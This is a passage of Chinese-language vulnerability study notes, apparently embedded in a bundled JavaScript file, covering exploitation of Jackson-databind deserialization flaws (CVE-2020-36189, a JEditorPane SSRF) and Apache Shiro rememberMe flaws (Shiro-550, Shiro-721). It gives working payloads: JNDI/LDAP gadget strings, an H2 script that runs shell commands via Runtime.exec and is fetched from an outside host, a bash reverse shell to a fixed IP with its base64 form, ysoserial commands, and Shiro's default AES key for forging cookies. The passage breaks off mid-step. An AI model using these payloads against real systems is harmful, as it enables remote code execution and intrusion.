                      1\u3001\u73AF\u5883\u642D\u5EFA
                              \u7B80\u6613Web\u670D\u52A1
                                      python -m http.server
                              LDAP\u670D\u52A1
                                      1\u3001\u4F7F\u7528 marshalsec \u6765\u542F\u52A8\u4E00\u4E2ALDAP\u670D\u52A1\uFF1A
                                              \u9700\u8981\u5148\u4E0B\u8F7D\uFF0CMarshalSec.jar \u7684JAR\u5305\u3002
                              \u6DFB\u52A0\u3010\u7B2C\u4E09\u65B9\u5E93\u4F9D\u8D56\u3011
                                      1\u3001\u9996\u5148\u67E5\u627E
                                              \u4F7F\u7528fc:com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource\u505A\u4E3A\u641C\u7D22\u5173\u952E\u5B57
                                                      1\u3001\u8FD9\u91CCfc\u6307full class\uFF0C\u5373\u5B8C\u6574class\u8DEF\u5F84\u3002
                                      2\u3001\u53EF\u4EE5\u770B\u5230\u6211\u4EEC\u9700\u8981\u7684\u7B2C\u4E09\u65B9\u4F9D\u8D56\u5E93\u662Fnewrelic-agent\uFF0C\u9700\u8981\u6CE8\u610F\u7248\u672C\u4F7F\u7528\u641C\u7D22\u7ED3\u679C\u4E2D\u7684\u5C31\u53EF\u4EE5\uFF083.35.0 \u5230 3.38.0\uFF09
                      2\u3001\u653B\u51FB\u94FE\u67E5\u627E\uFF1A
                              1\u3001\u53C2\u8003\u4E00\u4E0Bjackson\u53CD\u5E8F\u5217\u5316\u5176\u5B83\u76F8\u4F3C\u6F0F\u6D1EPOC\u4EE3\u7801\uFF0C\u8FD9\u91CC\u53C2\u8003\u4F7F\u7528\u4E86CVE-2020-35490\u7684POC\u4EE3\u7801\u3002
                                      1\u3001\u53EF\u4EE5\u770B\u5230payload\u7684\u4E2D\u7684 com.nqadmin.rowset.JdbcRowSetImpl \u5C31\u662F\u5B58\u5728\u4E0D\u5B89\u5168\u53CD\u5E8F\u5217\u5316\u7684\u7EC4\u4EF6\u8DEF\u5F84\uFF0C\u800C\u540E\u9762\u7684\u53C2\u6570\u5C31\u662FJdbcRowSetImpl\u7C7B\u7684\u5C5E\u6027\u3002
                                              1\u3001\u6839\u636E\u6F0F\u6D1E\u901A\u544A\u4E2D\u7684\u7EC4\u4EF6\u4FE1\u606F\uFF0C\u6211\u4EEC\u5C06\u524D\u9762\u7684\u53C2\u6570\u66FF\u6362\u4E00\u4E0B\uFF0C\u63A5\u4E0B\u6765\u5C31\u9700\u8981\u53BB\u641C\u7D22\u4EE3\u7801\u67E5\u770B\u7C7B\u5C5E\u6027\u9700\u8981\u600E\u4E48\u8BBE\u7F6E\u4E86\u3002
                                              2\u3001\u5728\u6F0F\u6D1E\u63CF\u8FF0\u7684\u4E0D\u5B89\u5168\u7C7B\u4E2D\u641C\u7D22lookup\u5173\u952E\u5B57
                                                      1\u3001\u8FD9\u91CC\u7684lookup\u5C31\u662F\u4F1A\u89E6\u53D1JNDI\u6CE8\u5165\u7684\u5173\u952E\u4EE3\u7801
                                                              Context initialContext = new InitialContext();
                                                              Object obj = initialContext.lookup(this.jndiLocation);
                                      2\u3001\u90A3\u4E48\u6211\u4EEC\u5C31\u9700\u8981\u5728payload\u4E2D\u8BBE\u7F6E\u76F8\u5E94\u7684\u5C5E\u6027\uFF0C\u8FD9\u91CC\u5C31\u662FjndiLocation\uFF0C
                                              1\u3001\u901A\u8FC7\u518D\u6B21\u641C\u7D22\u4EE3\u7801\u53EF\u4EE5\u770B\u5230jndiLocation\u6709\u4E00\u4E2AsetJndiLocation\u65B9\u6CD5\uFF0C\u5E76\u4E14\u5728\u53CD\u5E8F\u5217\u5316\u8FC7\u7A0B\u662F\u4F1A\u81EA\u52A8\u8C03\u7528setter\u65B9\u6CD5\u7684\uFF0C
                                              2\u3001\u90A3\u6211\u4EEC\u76F4\u63A5\u5728payload\u4E2D\u8BBE\u7F6E\u5C5E\u6027\u5C31\u53EF\u4EE5\u4E86\u3002
                                                      {"jndiLocation":"ldap://127.0.0.1:28080/Exploit"}
                                      3\u3001\u7136\u540E\u518D\u67E5\u770Blookup\u6240\u5728\u4EE3\u7801\u7684\u89E6\u53D1\u6761\u4EF6\uFF0C\u6240\u5728\u7684\u51FD\u6570\u662FlookupDataSource\uFF0C
                                              1\u3001\u8FD9\u4E2A\u51FD\u6570\u5728getConnection\u51FD\u6570\u4E2D\u5B58\u5728\uFF0C\u5F53dataSource == null\u7684\u65F6\u5019\u4F1A\u6267\u884C\u5230\uFF0C\u800CdataSource\u5728\u7B2C\u4E00\u6B21\u8FDB\u5165\u65F6\u9ED8\u8BA4\u5C31\u662Fnull\u3002
                                              2\u3001getter\u65B9\u6CD5\u4F1A\u5728\u5E8F\u5217\u5316\u65F6\u88AB\u81EA\u52A8\u8C03\u7528\uFF0C\u610F\u5473\u7740getConnection\u4F1A\u5728\u5E8F\u5217\u5316\u65F6\u88AB\u8C03\u7528\u5230\u3002
                                                      1\u3001\u6211\u4EEC\u7684POC\u4EE3\u7801\u4E2D\u6700\u540E\u4F7F\u7528writeValueAsString\u5BF9\u5BF9\u8C61\u8FDB\u884C\u4E86\u5E8F\u5217\u5316\u64CD\u4F5C\uFF0C\u6240\u4EE5payload\u53EA\u8981\u8BBE\u7F6EjndiLocation\u5C5E\u6027\u5C31\u53EF\u4EE5\u4E86\u3002
                      3\u3001\u6700\u540E\uFF0C\u5B8C\u6574\u7684payload\u5982\u4E0B\uFF1A
                              String payload = "[\\"com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource\\",{\\"jndiLocation\\":\\"ldap://127.0.0.1:28080/Exploit\\"}]";


      CVE-2020-36189
              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                      Jackson-databind < 2.9.10.7

              \u5229\u7528\u6761\u4EF6
                      1\u3001\u5F00\u542FenableDefaultTyping()
                      2\u3001\u4F7F\u7528\u4E86com.h2database\\com.newrelic.agent.java\u7B2C\u4E09\u65B9\u4F9D\u8D56\u5E93

              \u6F0F\u6D1E\u6982\u8FF0
                      1\u3001com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource \u7C7B\u7ED5\u8FC7\u4E86\u4E4B\u524Djackson-databind\u7EF4\u62A4\u7684\u9ED1\u540D\u5355\u7C7B\uFF0C\u5E76\u4E14JDK\u7248\u672C\u8F83\u4F4E\u7684\u8BDD\uFF0C\u53EF\u9020\u6210SSRF&RCE\u3002

              \u539F\u7406\u5206\u6790
                      1\u3001com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource \u7C7B\u4E2D\u63D0\u4F9B\u4E86\u5BF9url\u7684set\u65B9\u6CD5\uFF0C\u53EF\u4EE5\u901A\u8FC7\u53CD\u5E8F\u5217\u5316\u8FDB\u884C\u8D4B\u503C\u64CD\u4F5C\uFF0C
                              1\u3001\u540C\u65F6\u5728 getConnection \u4E2D\u901A\u8FC7 DriverManager.getConnection() \u8FDB\u884C\u8FDC\u7A0B\u8FDE\u63A5\uFF0C\u53C2\u6570url\u53EF\u63A7\uFF0C
                                      1\u3001\u4ECE\u800C\u53EF\u5BFC\u81F4SSRF\uFF0C
                                      2\u3001\u5F53ClassPath\u4E2D\u5B58\u5728 h2\u6570\u636E\u5E93 \u65F6\u751A\u81F3\u53EF\u4EE5\u5BFC\u81F4RCE\u3002
                                              xxxxxx

                      2\u3001Gadget\u5982\u4E0B\uFF1A
                              1\u3001\u6700\u521D\u7684\u4E00\u4EFD\uFF1A
                                      DriverManagerConnectionSource
                                          ->seturl
                                              ->getConnection
                                                  ->DriverManager.getConnection(this.url)
                              2\u3001\u540E\u9762\u65B0\u589E\u7684\u4E24\u4E2A\uFF1A
                                      String json = "[\\"shaded.com.github.susom.database.shaded.com.zaxxer.hikari.HikariDataSource\\", {\\"metricRegistry\\": \\"ldap://127.0.0.1:1288/Exploit\\"}]"

                                      String json = "[\\"shaded.com.github.susom.database.shaded.com.zaxxer.hikari.HikariConfig\\", {\\"metricRegistry\\": \\"ldap://127.0.0.1:1288/Exploit\\"}]"



              \u6F0F\u6D1E\u5229\u7528
                      1\u3001\u6784\u9020exec.sql
                              CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
                                      java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A");
                                      return s.hasNext() ? s.next() : "";  }
                              $$;
                              CALL SHELLEXEC('calc.exe')
                      2\u3001\u7B80\u6613web\u670D\u52A1
                              python2 -m simpleHTTPServer 9090
                      3\u3001\u6267\u884C\u6F0F\u6D1EPOC1 \uFF08SSRF\uFF09
                              1\u3001poc.java\u4EE3\u7801\u5982\u4E0B\u6240\u793A\uFF1A
                                      "[\\"com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource\\", {\\"url\\":\\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://6vrdsp.dnslog.cn/exec.sql'\\"}]"
                              2\u3001dnslog\u5E73\u53F0\u7ED3\u679C
                                      xxxxxx  \uFF08\u6B63\u5E38\u60C5\u51B5\u4E0B\uFF0C\u5E94\u8BE5\u4F1A\u6709DNS\u67E5\u8BE2\u7684\u8BBF\u95EE\u8BB0\u5F55\uFF09
                      4\u3001\u6267\u884C\u6F0F\u6D1EPOC2 \uFF08RCE\uFF09
                              1\u3001Poc.java\u4EE3\u7801\u5982\u4E0B\u6240\u793A\uFF1A
                                      "[\\"com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource\\", {\\"url\\":\\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:9090/exec.sql'\\"}]"
                              2\u3001\u4E4B\u540E\u8FD0\u884C\u8BE5\u7A0B\u5E8F\uFF0C\u6210\u529F\u6267\u884C\u547D\u4EE4



  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("Jackson-databind SSRF",`

  Jackson-databind SSRF

      \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
              jackson-databind < 2.9.10.3
              jackson-databind < 2.10.2

      \u5229\u7528\u6761\u4EF6
              1\u3001\u5F00\u542FenableDefaultTyping()

      \u6F0F\u6D1E\u6982\u8FF0
              1\u3001\u6F0F\u6D1E\u7C7Bjavax.swing.JEditorPane\u6765\u6E90\u4E8EJDK\u4E0D\u9700\u8981\u4F9D\u8D56\u4EFB\u4F55jar\u5305\uFF0C\u8BE5\u7C7B\u5728jackson-databind\u8FDB\u884C\u53CD\u5E8F\u5217\u5316\u65F6\u53EF\u9020\u6210SSRF

      \u539F\u7406\u5206\u6790
              1\u3001\u9996\u5148\u5B9A\u4F4D\u5230javax.swing.JEditorPane\u7C7B\u7684setPage\u65B9\u6CD5\uFF0C\u4E4B\u540E\u5728\u6B64\u5904\u4E0B\u65AD\u70B9\u8FDB\u884C\u65AD\u70B9\u8C03\u8BD5\u5206\u6790
                      1\u3001\u5728setPage\u65B9\u6CD5\u4E2D\u4F1A\u9996\u5148\u53BB\u5224\u65AD\u4F20\u5165\u7684page\u662F\u5426\u4E3A\u7A7A\uFF0C\u5982\u679C\u4E3A\u7A7A\u5219\u629B\u51FA\u5F02\u5E38\u4FE1\u606F\uFF0C\u4E0D\u4E3A\u7A7A\u5219\u521D\u59CB\u5316\u4E00\u4E2Apage\u4E0A\u4E0B\u6587\u73AF\u5883(\u77E9\u5F62\uFF1A\u957F\u9AD8\u5404\u4E3A1\uFF0C\u4ECE(0,0)\u5F00\u59CB\uFF0C\u7C7B\u4F3C\u4E8E\u4E00\u4E2A\u65B0\u5EFA\u7684word\u6587\u6863)
                      2\u3001\u4E4B\u540E\u8BBE\u7F6Ereloaded\u4E3Afalse\uFF0C\u5E76\u6839\u636E\u4E4B\u524D\u8FD4\u56DE\u7684loaded\u662F\u5426\u4E3A\u7A7A\u7B49\u7EC4\u5408\u5224\u65AD\u8BED\u53E5\u6765\u51B3\u5B9A\u662F\u5426\u8FDB\u5165if\u8BED\u53E5\u4E2D\uFF0C\u800Cloaded\u6E90\u81EAgetPage()\uFF0CgetPage\u4E3A\u7A7A\u6240\u4EE5\u6B64\u65F6\u7684loaded\u4E3Anull\uFF0C\u5373\u6EE1\u8DB3if\u6761\u4EF6\u7684\u7B2C\u4E00\u9879\uFF0C
                              1\u3001\u7531\u4E8E\u662F\u91C7\u7528\u7684\u6216\u5173\u7CFB\u6761\u4EF6\u5224\u65AD\u8BED\u53E5\uFF0C\u6240\u4EE5\u76F4\u63A5\u8FDB\u5165if\u8BED\u53E5\u4E2D\u6267\u884C\u540E\u7EED\u4EE3\u7801\uFF1A
                                      xxxxxx
                              2\u3001\u4E4B\u540E\u901A\u8FC7\u51FD\u6570getAsynchronousLoadPriority\u6765\u5224\u65ADdocument\u7684\u52A0\u8F7D\u4F18\u5148\u7EA7\u5E76\u5C06\u5176\u8D4B\u503C\u7ED9p\u53D8\u91CF\uFF0C\u4ECE\u4E0B\u8FF0\u4EE3\u7801\u4E2D\u53EF\u4EE5\u770B\u51FA\u5982\u679C\u4E0D\u652F\u6301\u5219\u8FD4\u56DE\u201C-1\u201D\uFF1A
                                      xxxxxx
                              3\u3001\u4E4B\u540E\u5224\u65ADp\u7684\u503C\u662F\u5426\u5C0F\u4E8E0\uFF0C\u5982\u679C\u5C0F\u4E8E0\uFF0C\u5219\u8FDB\u5165if\u8BED\u53E5\u4E2D\uFF0C\u6B64\u65F6\u7684p\u8FD4\u56DE\u503C\u4E3A\u2014\u201C-1\u201D\uFF0C\u4E4B\u540E\u8FDB\u5165if\u8BED\u53E5\u4E2D\uFF0C\u4E4B\u540Epage(\u6211\u4EEC\u6784\u9020DNSlog\u57DF\u540D)\u4F1A\u4F5C\u4E3A\u53C2\u6570\u4F20\u9012\u8FDB\u5165getStream\u4E2D\uFF0C\u6211\u4EEC\u7EE7\u7EED\u8DDF\u8FDB\u53BB\uFF1A
                                      1\u3001\u4E4B\u540E\u53EF\u4EE5\u770B\u5230\u5728\u5728getStream\u4E2D\u8C03\u7528page.openConnection()\u4ECE\u800C\u5F97\u5230\u4E00\u4E2AHttpURLConnection\u5BF9\u8C61\u5B9E\u4F8B
                                      2\u3001\u4E4B\u540E\u5224\u65AD\u65B0\u5EFA\u7684conn\u662F\u5426\u662F\u4E00\u4E2AHttpURLConnection\u5BF9\u8C61\u7684\u5B9E\u4F8B
                                      3\u3001\u4E4B\u540E\u65B0\u5EFAHttpURLConnection\u5B9E\u4F8B\u5BF9\u8C61\uFF0C\u5E76\u5C06conn\u8D4B\u503C\u7ED9hconn\uFF0C\u4E4B\u540E\u8BBE\u7F6E\u662F\u5426\u8DDF\u968F\u91CD\u5B9A\u5411\uFF0C\u4EE5\u53CApostData\uFF0C\u7136\u800C\u6B64\u65F6\u7684postData\u5E76\u6CA1\u6709\u4EFB\u4F55\u6570\u636E\u4FE1\u606F\uFF0C\u6240\u4EE5\u4F1A\u76F4\u63A5\u8DF3\u8FC7if\u8BED\u53E5
                                      4\u3001\u3001\u4E4B\u540E\u7EE7\u7EED\u8DDF\u8FDBgetResponseCode\u83B7\u53D6\u54CD\u5E94\u503C\u7684\u51FD\u6570\u4E2D
                                      5\u3001\u4E4B\u540E\u8C03\u7528getInputStream()\uFF0C\u5E76\u786E\u4FDD\u6211\u4EEC\u5DF2\u7ECF\u8FDE\u63A5\u5230\u670D\u52A1\u5668\uFF0C\u5982\u679C\u6CA1\u6709status\u4FE1\u606F\uFF0C\u5219\u629B\u51FA\u5F02\u5E38\uFF0C\u4E0B\u9762\u6211\u4EEC\u7EE7\u7EED\u8DDF\u8FDB\u5230getInputStream()\u51FD\u6570\u4E2D
                                              1\u3001\u53EF\u4EE5\u770B\u5230\uFF0C\u622A\u6B62\u76EE\u524D\u4E3A\u6B62\u6211\u4EEC\u8FD8\u672A\u8FDE\u63A5\u5230\u76EE\u6807\u670D\u52A1\u5668\uFF0Cconnecting\u4E3Afalse\uFF0C\u800C\u63A5\u4E0B\u6765\u8981\u505A\u7684\u5C31\u662F\u8FDE\u63A5\u76EE\u6807\u670D\u52A1\u5668\uFF0C\u4E5F\u5C31\u662F\u6211\u4EEC\u4F20\u9012\u8FDB\u53BB\u7684DNSlog\u57DF\u540D\u5730\u5740\uFF0C\u6211\u4EEC\u7EE7\u7EED\u8DDF\u8FDB\u5206\u6790
                                              2\u3001\u4E4B\u540Econnecting\u88AB\u8BBE\u7F6E\u4E3A"true"\uFF0C\u5E76\u68C0\u67E5URL\u7684Socket\u901A\u4FE1\u662F\u5426\u5141\u8BB8\uFF0C\u4E4B\u540E\u8C03\u7528getInputStream0()\u51FD\u6570
                                              3\u3001\u5728getInputStream0()\u51FD\u6570\u4E2D\u9996\u5148\u5224\u65AD\u6B64\u65F6\u7684doInput\u662F\u5426\u4E3Afalse\uFF0C\u5982\u679C\u6B64\u65F6\u7684doInput\u4E3Afalse\u5219\u65E0\u6CD5\u4F7F\u7528URL\u8FDE\u63A5\u8FDB\u884C\u8F93\u5165\uFF0C\u4E5F\u65E0\u6CD5\u5224\u65AD\u662F\u5426\u6210\u529F\u8FDE\u63A5\uFF0C\u6545\u800C\u4F1A\u629B\u51FA\u5F02\u5E38\uFF0C\u6B64\u65F6doInput\u4E3Atrue\uFF0C
                                                      1\u3001\u4E4B\u540E\u8FDB\u5165\u5230else\u5224\u65AD\u8BED\u53E5\u4E2D\uFF0C\u800C\u6B64\u65F6\u7684rememberException\u4E3Anull\uFF0C\u6240\u4EE5\u4E5F\u4E0D\u4F1A\u8FDB\u5165\u540E\u7EED\u7684else\u4E2D\uFF0C\u76F4\u63A5\u7EE7\u7EED\u5F80\u4E0B\u6267\u884C
                                                      2\u3001streaming\u4E3Afalse\uFF0C\u7EE7\u7EED\u8DF3\u8FC7if\u4E2D\u7684\u8BED\u53E5\uFF0C\u5F80\u4E0B\u6267\u884C
                                                      3\u3001\u4E4B\u540E\u4E00\u8DEF\u5F80\u4E0B\u8DDF\u8E2A\uFF0C\u6700\u540E\u8C03\u7528this.connect()\u6765\u5EFA\u7ACB\u8FDE\u63A5
                                                      4\u3001\u4E4B\u540E\u8C03\u7528this.plainConnect()\u65B9\u6CD5
                                                      5\u3001\u4E4B\u540E\u518D\u53BB\u8C03\u7528plainConnect0()
                                                      6\u3001\u4E4B\u540E\u8DDF\u8FDB\u5230this.getNewHttpClient(this.url, var4, this.connectTimeout);\u5904\uFF0C\u4E0B\u9762\u7EE7\u7EED\u8DDF\u8FDB\u53BB
                                                      7\u3001\u4E4B\u540E\u8C03\u7528get\u65B9\u6CD5\uFF0C\u5E76\u8BBE\u7F6Ekeep-alive
                                                      8\u3001\u4E4B\u540E\u6765\u5230HttpClient()\u5904\uFF0C\u7EE7\u7EED\u8DDF\u8FDB
                                                      9\u3001\u8BBE\u7F6E\u8BF7\u6C42\u53C2\u6570(host\u3001port\u3001proxy\u3001keeepAliveConnection\u3001KeepAliveTimeout\u7B49\u7B49)
                                                      10\u3001\u4E4B\u540E\u8C03\u7528openServer()\u5F00\u542F\u8FDE\u63A5
                                                      11\u3001\u4E4B\u540E\u68C0\u67E5\u534F\u8BAE\u7B49\u4FE1\u606F\uFF0C\u5E76\u8C03\u7528openServer(host,port)\u6765\u5EFA\u7ACB\u8FDE\u63A5\uFF0C\u4E0B\u9762\u7EE7\u7EED\u8DDF\u8FDB
                                                      12\u3001\u4E4B\u540E\u518D\u6B21\u8C03\u7528doConnect()
                                                      13\u3001\u4E4B\u540E\u8C03\u7528InetSocketAddress()\u51FD\u6570
                                                      14\u3001\u4E4B\u540E\u8C03\u7528InetAddress.getByName()\uFF0C\u8FD9\u4E2A\u51FD\u6570\u60F3\u5FC5\u5927\u5BB6\u5DF2\u7ECF\u90FD\u5F88\u719F\u6089\u4E86\uFF0C\u8BE5\u51FD\u6570\u5728\u7ED9\u5B9A\u7684\u4E3B\u673A\u540D\u7684\u60C5\u51B5\u4E0B\u6765\u83B7\u53D6\u4E3B\u673A\u7684IP\u5730\u5740\uFF0C\u8FD9\u4E5F\u662F\u89E6\u53D1SSRF\u7684\u6839\u672C\u6240\u5728\u70B9
              2\u3001\u540C\u65F6\u5728DNSLog\u7AEF\u4E5F\u63A5\u6536\u5230\u8BF7\u6C42\u3002
                      1\u3001\u6574\u4E2A\u8DDF\u8E2A\u6D41\u7A0B\u76F8\u5BF9\u6765\u8BF4\u8F6C\u63A5\u5F88\u591A\uFF0C\u6D89\u53CA\u591A\u4E2A\u6587\u4EF6\uFF0C\u6709\u5174\u8DA3\u7684\u5C0F\u4F19\u4F34\u53EF\u4EE5\u5C1D\u8BD5\u8DDF\u8E2A\u5206\u6790\u4E00\u6CE2\u770B\u770B


      \u6F0F\u6D1E\u5229\u7528
              1\u3001payload\u5982\u4E0B\uFF1A
                      String payload = "[\\"javax.swing.JEditorPane\\",{\\"page\\":\\"http://qb7fky.dnslog.cn\\"}]"
              2\u3001\u7ED3\u679C\uFF1A
                      \u4E4B\u540E\u5728DNSlog\u7AEF\u6210\u529F\u6536\u5230\u8BF7\u6C42\u3002


  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0})],pu=[Object(u.c)("Shiro rememberMe\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\uFF08Shiro-550\uFF09    \uFF08CVE-2016-4437\uFF09",`


      Shiro rememberMe\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\uFF08Shiro-550\uFF09    \uFF08CVE-2016-4437\uFF09
              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                      Apache Shiro <= 1.2.4

              \u5229\u7528\u6761\u4EF6

              \u6F0F\u6D1E\u6982\u8FF0

              \u539F\u7406\u5206\u6790
                      1\u3001Apache Shiro\u6846\u67B6\u63D0\u4F9B\u4E86\u8BB0\u4F4F\u5BC6\u7801\u7684\u529F\u80FD\uFF08RememberMe\uFF09\uFF0C\u7528\u6237\u767B\u5F55\u6210\u529F\u540E\u4F1A\u751F\u6210\u7ECF\u8FC7\u52A0\u5BC6\u5E76\u7F16\u7801\u7684cookie\u3002
                              1\u3001\u5728\u670D\u52A1\u7AEF\u5BF9rememberMe\u7684cookie\u503C\uFF0C\u5148base64\u89E3\u7801\u3001\u7136\u540EAES\u89E3\u5BC6\u3001\u518D\u53CD\u5E8F\u5217\u5316\uFF0C\u5C31\u5BFC\u81F4\u4E86\u53CD\u5E8F\u5217\u5316RCE\u6F0F\u6D1E\u3002
                              2\u3001\u90A3\u4E48\uFF0CPayload\u4EA7\u751F\u7684\u8FC7\u7A0B\uFF1A
                                      \u547D\u4EE4=>\u5E8F\u5217\u5316=>AES\u52A0\u5BC6=>base64\u7F16\u7801=>RememberMe Cookie\u503C
                              3\u3001\u5728\u6574\u4E2A\u6F0F\u6D1E\u5229\u7528\u8FC7\u7A0B\u4E2D\uFF0C\u6BD4\u8F83\u91CD\u8981\u7684\u662FAES\u52A0\u5BC6\u7684\u5BC6\u94A5\uFF0C
                                      1\u3001\u5982\u679C\u6CA1\u6709\u4FEE\u6539\u9ED8\u8BA4\u7684\u5BC6\u94A5\uFF0C\u90A3\u4E48\u5C31\u5F88\u5BB9\u6613\u5C31\u77E5\u9053\u5BC6\u94A5\u4E86,Payload\u6784\u9020\u8D77\u6765\u4E5F\u662F\u5341\u5206\u7684\u7B80\u5355\u3002

              \u6F0F\u6D1E\u5229\u7528
                      1\u3001\u6F0F\u6D1E\u68C0\u6D4B\uFF1A
                              1\u3001\u7B2C\u4E00\u79CD\u65B9\u5F0F\uFF1A\u8FD4\u56DE\u5305\u4E2D\u5305\u542B \u300ArememberMe=deleteMe\u300B \u5B57\u6BB5\u3002
                              2\u3001\u7B2C\u4E8C\u79CD\u65B9\u5F0F\uFF1A\u4F7F\u7528\u4E00\u4E2A  Shiro_exploit.py \u5DE5\u5177\uFF1A
                                      \u4ED3\u5E93\u5730\u5740\uFF1Ahttps://github.com/insightglacier/Shiro_exploit
                      2\u3001\u653B\u51FB\u5229\u7528\uFF1A
                              1\u3001\u7B2C\u4E00\u79CD\u65B9\u5F0F\uFF1A
                                      1\u3001\u5236\u4F5C\u53CD\u5F39shell\u4EE3\u7801
                                              // \u539F\u59CB\uFF0C\u5E0C\u671B\u670D\u52A1\u5668\u6267\u884C\u7684shell\u547D\u4EE4
                                              bash -i >& /dev/tcp/192.168.172.133/1234 0>&1
                                              // \u5C06\u5176\u8FDB\u884C\u7F16\u7801\uFF0C\u4EE5\u514D Java\u5B57\u7B26\u4E32\u8F6C\u4E49 \u4EA7\u751F\u5E72\u6270
                                              bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}
                                      2\u3001\u901A\u8FC7 YsoSerial\u5DE5\u5177\u5305 \u7684 JRMP\u76D1\u542C\u6A21\u5757\uFF0C\u76D1\u542C6666\u7AEF\u53E3\u5E76\u6267\u884C\u53CD\u5F39shell\u547D\u4EE4\u3002
                                              java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4
                                                              'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}'
                                      3\u3001\u4F7F\u7528shiro.py \u751F\u6210Payload
                                              \uFF08shiro.py\u7684\u5185\u5BB9\u5FFD\u7565\uFF09
                                              python shiro.py 192.168.172.133:6666
                                      4\u3001\u6784\u9020\u6570\u636E\u5305\uFF0C\u4F2A\u9020cookie\uFF0C\u53D1\u9001Payload
                                              1\u3001\u5C06\u5176\u586B\u5165  \u8BF7\u6C42\u5934\u7684Cookie  \u4E2D\u7684\u300ArememberMe\u300B\u5B57\u6BB5\u3002
                              2\u3001\u7B2C\u4E8C\u79CD\u65B9\u5F0F\uFF1A
                                      1\u3001\u501F\u52A9 YsoSerial\u5DE5\u5177\u5305\uFF0C \u751F\u6210poc.ser\u6587\u4EF6
                                              sudo java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 "touch /tmp/success" > poc.ser
                                      2\u3001\u4F7F\u7528Shiro\u5185\u7F6E\u7684\u9ED8\u8BA4\u5BC6\u94A5\u5BF9Payload\u8FDB\u884C\u52A0\u5BC6\uFF1A
                                              1\u3001\u9ED8\u8BA4\u5BC6\u94A5\uFF0C\u53EF\u5728 Shiro\u5F00\u6E90\u4ED3\u5E93 \u4E2D\u627E\u5230\uFF1A
                                                      \u4E3A\uFF1A\u300AkPH+bIxk5D2deZiIxcaaaA==\u300B
                                      3\u3001\u6784\u9020\u6570\u636E\u5305\uFF0C\u4F2A\u9020cookie\uFF0C\u53D1\u9001Payload
                                              1\u3001\u5C06\u5176\u586B\u5165  \u8BF7\u6C42\u5934\u7684Cookie  \u4E2D\u7684\u300ArememberMe\u300B\u5B57\u6BB5\u3002


  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("Shiro Padding Oracle Attack\uFF08Shiro-721\uFF09    \uFF08CVE-2019-12422\uFF09",`



      Shiro Padding Oracle Attack\uFF08Shiro-721\uFF09    \uFF08CVE-2019-12422\uFF09
              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                      1.2.5 <= Apache Shiro < 1.4.2\u7248\u672C\u3002

              \u5229\u7528\u6761\u4EF6

              \u6F0F\u6D1E\u6982\u8FF0

              \u539F\u7406\u5206\u6790
                      1\u3001\u7531\u4E8EApache Shiro cookie\u4E2D\u901A\u8FC7 AES-128-CBC \u6A21\u5F0F\u52A0\u5BC6\u7684rememberMe\u5B57\u6BB5\u5B58\u5728\u95EE\u9898\uFF0C
                              1\u3001\u7528\u6237\u53EF\u901A\u8FC7Padding Oracle \u52A0\u5BC6\u751F\u6210\u7684\u653B\u51FB\u4EE3\u7801\u6765\u6784\u9020\u6076\u610F\u7684rememberMe\u5B57\u6BB5\uFF0C
                                      1\u3001\u5E76\u91CD\u65B0\u8BF7\u6C42\u7F51\u7AD9\uFF0C\u8FDB\u884C\u53CD\u5E8F\u5217\u5316\u653B\u51FB\uFF0C\u6700\u7EC8\u5BFC\u81F4\u4EFB\u610F\u4EE3\u7801\u6267\u884C\u3002
                      2\u3001AES-128-CBC \u52A0\u5BC6\u6A21\u5F0F
                              \u7565
                      3\u3001Padding Oracle Attack \u539F\u7406
                              \u7565
                      4\u3001CBC\u7FFB\u8F6C\u653B\u51FB\u8FC7\u7A0B
                              \u7565

              \u6F0F\u6D1E\u5229\u7528
                      1\u3001\u767B\u5F55Shiro\u7F51\u7AD9\uFF0C\u4ECEcookie\u4E2D\u83B7\u5F97rememberMe\u5B57\u6BB5\u7684\u503C\u3002
                      2\u3001\u6211\u4EEC\u5E0C\u671B\u5229\u7528\u300ADNSlog\u63A2\u6D4B\u300B\uFF0C\u901A\u8FC7 YsoSerial\u5DE5\u5177 \u751F\u6210payload\uFF1A
                              java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 "ping 75bbot.dnslog.cn" > payload.class
                      3\u3001\u4F7F\u7528rememberMe\u503C\u4F5C\u4E3Aprefix\uFF0C\u52A0\u8F7DPayload\uFF0C\u8FDB\u884CPadding Oracle\u653B\u51FB\u3002
                              1\u3001\u76F8\u5173\u5DE5\u5177\uFF0C
                                      Github\u9879\u76EE\u5730\u5740\uFF1Ahttps://github.com/longofo/PaddingOracleAttack-Shiro-721
                              2\u3001\u4F7F\u7528\u300APaddingOracleAttack\u300B\u5DE5\u5177
                                      1\u3001\u4EE3\u7801\u793A\u4F8B\uFF1A
